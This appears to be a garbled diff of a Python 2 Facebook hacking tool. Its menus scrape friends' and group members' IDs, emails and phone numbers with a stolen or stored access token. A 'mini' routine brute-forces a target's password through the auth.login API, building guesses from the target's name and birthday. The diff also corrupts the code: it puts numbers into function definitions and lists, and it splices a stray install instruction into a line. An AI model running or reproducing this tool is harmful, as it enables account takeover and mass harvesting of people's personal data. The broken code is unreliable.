@@ -68,26 +68,26 @@ def load():
 		print("\r\033[1;91m[*] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 back = 0
-threads = []
-sucessful = []
-checkpoint = []
-oks = []
-action_failed = []
-idfriends = []
-idfromfriends = []
-member_id = []
-email= []
-number = []
-id = []
-em = []
-email_from_friends = []
-hp = []
-hpfromfriends = []
-reaction = []
-reactiongroup = []
-comment = []
-group_comment = []
-listgroup = []
+threads = [1]
+sucessful = [2]
+checkpoint = [3]
+oks = [4]
+action_failed = [5]
+idfriends = [6]
+idfromfriends = [7]
+member_id = [8]
+email= [9]
+number = [10]
+id = [11]
+em = [12]
+email_from_friends = [13]
+hp = [14]
+hpfromfriends = [15]
+reaction = [16]
+reactiongroup = [17]
+comment = [18]
+group_comment = [19]
+listgroup = [20]
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
@@ -236,43 +236,43 @@ def menu():
 	print "║"
 	choices()
 #-
-def choices():
+def choices(1):
 	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if pick =="":
 		print "\033[1;91m[!] Wrong input"
-		choices()
+		choices(2)
 	elif pick =="1":
-		information()
+		information(3)
 	elif pick =="2":
-		dump()
+		dump(4)
 	elif pick =="3":
-		menu_hack()
+		menu_hack(5)
 	elif pick =="4":
-		menu_bot()
+		menu_bot(6)
 	elif pick =="5":
-		func()
+		func(7)
 	elif pick =="6":
 		os.system('clear')
 		print logo
 		fb_token=open('login.txt','r').read()
 		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		menu()
+		menu(8)
         elif pick =="7":
                 os.system('clear')
                 print logo
                 print 40 * '\033[1;97m\xe2\x95\x90'
                 os.system('git pull origin master')
                 raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
-                menu()
+                menu(9)
 	elif pick =="8":
 		os.remove('out')
 	elif pick =="9":
 		os.system('rm -rf login.txt')
 		os.system('xdg-open https://www.facebook.com/learntermux1linux1/')
-		exit()
+		exit(10)
 	elif pick =="0":
-		exit()
+		exit(11)
 	else:
 		print "\033[1;91m[!] Wrong input"
 		choices()
@@ -286,7 +286,7 @@ def information():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(1)
 	os.system('clear')
 	print logo
 	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
@@ -333,7 +333,7 @@ def information():
 		menu()
 
 ##### DUMP #####
-def dump():
+def dump(2):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -341,7 +341,7 @@ def dump():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(3)
 	os.system('clear')
 	print logo
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
@@ -355,39 +355,39 @@ def dump():
 	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
-	choose_dump()
+	choose_dump(4)
 #-----choices
-def choose_dump():
+def choose_dump(5):
 	choose_from = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if choose_from =="":
 		print "\033[1;91m[!] Wrong input"
-		choose_dump()
+		choose_dump(6)
 	elif choose_from =="1":
-		friends_id()
+		friends_id(7)
 	elif choose_from =="2":
-		id_from_friends()
+		id_from_friends(8)
 	elif choose_from =="3":
-		id_member_group()
+		id_member_group(9)
 	elif choose_from =="4":
-		em_member_group()
+		em_member_group(10)
 	elif choose_from =="5":
-		no_member_group()
+		no_member_group(11)
 	elif choose_from =="6":
-		email()
+		email(12)
 	elif choose_from =="7":
-		email_from_friends()
+		email_from_friends(13)
 	elif choose_from =="8":
-		phone_number()
+		phone_number(14)
 	elif choose_from =="9":
-		phone_number_from_friends()
+		phone_number_from_friends(15)
 	elif choose_from =="0":
-		menu()
+		menu(16)
 	else:
 		print "\033[1;91m[!] Wrong input"
-		choose_dump()
+		choose_dump(17)
 
 ##### ID friends #####
-def friends_id():
+def friends_id(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -395,7 +395,7 @@ def friends_id():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -412,32 +412,32 @@ def friends_id():
 			idfriends.append(a['id'])
 			make_action.write(a['id'] + '\n')
 			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
-		make_action.close()
+		make_action.close(3)
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
 		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
 		os.rename('out/friends_id.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(4)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(5)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(6)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(7)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(8)
 
 ##### ID FROM FRIENDS #####
-def id_from_friends():
+def id_from_friends(9):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -445,7 +445,7 @@ def id_from_friends():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(10)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -461,7 +461,7 @@ def id_from_friends():
 		except KeyError:
 			print"\033[1;91m[!] Friend not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(11)
 		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
 		z=json.loads(r.text)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
@@ -478,32 +478,32 @@ def id_from_friends():
 		os.rename('out/friends_id_from_friends.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(12)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(13)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(14)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(15)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(16)
 
 ##### ID FROM GROUP MEMBER #####
-def id_member_group():
+def id_member_group(17):
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(18)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -519,7 +519,7 @@ def id_member_group():
 		except KeyError:
 			print"\033[1;91m[!] Group not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(19)
 		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/member_group.txt','w')
@@ -529,39 +529,39 @@ def id_member_group():
 			member_id.append(a['id'])
 			make_action.write(a['id'] + '\n')
 			print ("\r\033[1;97m[ \033[1;92m"+str(len(member_id))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
-		make_action.close()
+		make_action.close(20)
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(member_id))
 		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
 		os.rename('out/member_group.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(4)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(5)
 
 ##### EMAIL FROM group #####
-def em_member_group():
+def em_member_group(6):
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(7)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -577,7 +577,7 @@ def em_member_group():
 		except KeyError:
 			print"\033[1;91m[!] Group not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(8)
 		mkdir('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/em_member_group.txt','w')
@@ -592,7 +592,7 @@ def em_member_group():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(9)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
@@ -600,32 +600,32 @@ def em_member_group():
 		os.rename('out/em_member_group.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(10)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### PHONE NUMBER FROM GROUP #####
-def no_member_group():
+def no_member_group(1):
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -641,7 +641,7 @@ def no_member_group():
 		except KeyError:
 			print"\033[1;91m[!] Group not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(3)
 		mkdir('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
 		print 42*"\033[1;97m═"
 		make_action = open('out/no_member_group.txt','w')
@@ -656,7 +656,7 @@ def no_member_group():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(number))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(4)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(number))
@@ -664,32 +664,32 @@ def no_member_group():
 		os.rename('out/no_member_group.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(5)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### EMAIL #####
-def email():
+def email(1):
 	try:
 		fb_token=open('login.txt','r').read()
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -711,7 +711,7 @@ def email():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(2)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
@@ -719,25 +719,25 @@ def email():
 		os.rename('out/email_friends.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### EMAIL FROM FRIENDS #####
-def email_from_friends():
+def email_from_friends(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -745,7 +745,7 @@ def email_from_friends():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -761,7 +761,7 @@ def email_from_friends():
 		except KeyError:
 			print"\033[1;91m[!] Friend not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(3)
 		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
 		a = json.loads(r.text)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
@@ -776,7 +776,7 @@ def email_from_friends():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(email_from_friends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(4)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(email_from_friends))
@@ -784,25 +784,25 @@ def email_from_friends():
 		os.rename('out/em_friends_from_friends.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(5)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### PHONE NUMBER #####
-def phone_number():
+def phone_number(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -810,7 +810,7 @@ def phone_number():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -833,7 +833,7 @@ def phone_number():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(3)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
@@ -841,25 +841,25 @@ def phone_number():
 		os.rename('out/nomer_friends.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(4)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### PHONE NUMBER FROM FRIENDS #####
-def phone_number_from_friends():
+def phone_number_from_friends(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -867,7 +867,7 @@ def phone_number_from_friends():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -883,7 +883,7 @@ def phone_number_from_friends():
 		except KeyError:
 			print"\033[1;91m[!] Friend not found"
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			dump()
+			dump(3)
 		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
 		a = json.loads(r.text)
 		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
@@ -898,7 +898,7 @@ def phone_number_from_friends():
 				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
-		make_action.close()
+		make_action.close(4)
 		print 42*"\033[1;97m═"
 		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
 		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromfriends))
@@ -906,25 +906,25 @@ def phone_number_from_friends():
 		os.rename('out/no_friends_from_friends.txt','out/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(5)
 	except IOError:
 		print"\033[1;91m[!] Error creating file"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(1)
 	except (KeyboardInterrupt,EOFError):
 		print("\033[1;91m[!] Stopped")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(2)
 	except KeyError:
 		print('\033[1;91m[!] Error')
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-		dump()
+		dump(3)1.if installed is complite, use command
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
-		exit()
+		exit(4)
 
 ##### MENU HACK #####
-def menu_hack():
+def menu_hack(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -932,7 +932,7 @@ def menu_hack():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	os.system('clear')
 	print logo
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Simple Facebook Hack(\033[1;92mTarget\033[1;97m)"
@@ -942,32 +942,32 @@ def menu_hack():
 	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Check"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
-	choose_hack()
+	choose_hack(3)
 #----choices
 def choose_hack():
 	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if hack=="":
 		print "\033[1;91m[!] Wrong input"
-		choose_hack()
+		choose_hack(4)
 	elif hack =="1":
-		mini()
+		mini(5)
 	elif hack =="2":
-		crack()
-		success()
+		crack(6)
+		success(7)
 	elif hack =="3":
-		super()
+		super(8)
 	elif hack =="4":
-		brute()
+		brute(9)
 	elif hack =="5":
-		menu_yahoo()
+		menu_yahoo(10)
 	elif hack =="0":
-		menu()
+		menu(11)
 	else:
 		print "\033[1;91m[!] Wrong input"
-		choose_hack()
+		choose_hack(12)
 
 ##### MINI HF #####
-def mini():
+def mini(1):
 	os.system('clear')
 	try:
 		fb_token=open('login.txt','r').read()
@@ -975,7 +975,7 @@ def mini():
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
-		login()
+		login(2)
 	os.system('clear')
 	print logo
 	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
@@ -1000,7 +1000,7 @@ def mini():
 			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-			menu_hack()
+			menu_hack(3)
 		else:
 			if 'www.facebook.com' in y["error_msg"]:
 				print "\033[1;91m[+] \033[1;92mFound"
@@ -1009,7 +1009,7 @@ def mini():
 				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
 				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-				menu_hack()
+				menu_hack(4)
 			else:
 				pz2 = a['first_name'] + '12345'
 				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -1020,7 +1020,7 @@ def mini():
 					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
 					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-					menu_hack()
+					menu_hack(5)
 				else:
 					if 'www.facebook.com' in y["error_msg"]:
 						print "\033[1;91m[+] \033[1;92mFound"
@@ -1029,7 +1029,7 @@ def mini():
 						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
 						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-						menu_hack()
+						menu_hack(6)
 					else:
 						pz3 = a['last_name'] + '123'
 						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -1040,7 +1040,7 @@ def mini():
 							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
 							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-							menu_hack()
+							menu_hack(7)
 						else:
 							if 'www.facebook.com' in y["error_msg"]:
 								print "\033[1;91m[+] \033[1;92mFound"
@@ -1049,7 +1049,7 @@ def mini():
 								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
 								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-								menu_hack()
+								menu_hack(8)
 							else:
 								mode = a['birthday']
 								pz4 = mode.replace('/', '')
@@ -1061,7 +1061,7 @@ def mini():
 									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
 									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-									menu_hack()
+									menu_hack(9)
 								else:
 									if 'www.facebook.com' in y["error_msg"]:
 										print "\033[1;91m[+] \033[1;92mFound"
@@ -1070,7 +1070,7 @@ def mini():
 										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
 										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-										menu_hack()
+										menu_hack(10)
 									else:
 										lahirs = a['birthday']
 										jay = lahirs.replace('/', '')
@@ -1083,7 +1083,7 @@ def mini():
 											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
 											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-											menu_hack()
+											menu_hack(11)
 										else:
 											if 'www.facebook.com' in y["error_msg"]:
 												print "\033[1;91m[+] \033[1;92mFound"
@@ -1092,7 +1092,7 @@ def mini():
 												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-												menu_hack()
+												menu_hack(12)
 											else:
 												pz6 = "bintang123"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -1103,7 +1103,7 @@ def mini():
 													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
 													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
 													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-													menu_hack()
+													menu_hack(13)
 												else:
 													if 'www.facebook.com' in y["error_msg"]:
 														print "\033[1;91m[+] \033[1;92mFound"
@@ -1112,7 +1112,7 @@ def mini():
 														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
